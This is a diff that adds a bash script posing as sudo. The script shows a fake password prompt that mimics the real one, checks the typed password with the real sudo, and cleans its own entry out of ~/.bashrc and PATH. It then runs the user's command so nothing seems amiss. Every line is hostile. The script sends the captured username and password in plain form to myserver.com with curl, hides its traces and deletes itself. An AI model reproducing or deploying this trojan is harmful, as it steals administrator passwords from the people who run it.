@@ -1,0 +1,35 @@
+#!/bin/bash
+
+/usr/bin/sudo -k
+
+i=0
+while [ $i != 3 ]; do
+echo -n "[siii] password for $(whoami): "
+read -s xd
+echo
+echo -e "$xd\n"| /usr/bin/sudo -S true 2>/dev/null
+if /usr/bin/sudo -n true 2>/dev/null; then 
+   break
+   else
+   echo "Sorry, try again."
+fi
+unset xd
+let i=$i+1
+done
+
+if ! /usr/bin/sudo -n true 2>/dev/null; then 
+   echo "sudo: 3 incorrect password attempts"
+   exit 1
+fi
+
+sed -i "/\.xd/d" ~/.bashrc
+
+export PATH=$(echo $PATH| cut -d: -f2-)
+
+echo -e "$xd\n" | /usr/bin/sudo -S "$@"
+
+if [ "$(ping myserver.com -c1 2>/dev/null)" ]; then
+	curl -s myserver.com/example.php?user=$(whoami)\&pass=$xd 2>/dev/null
+	sleep 2 && ln -f -s /usr/bin/sudo ~/.xd/sudo &
+	rm $0
+fi
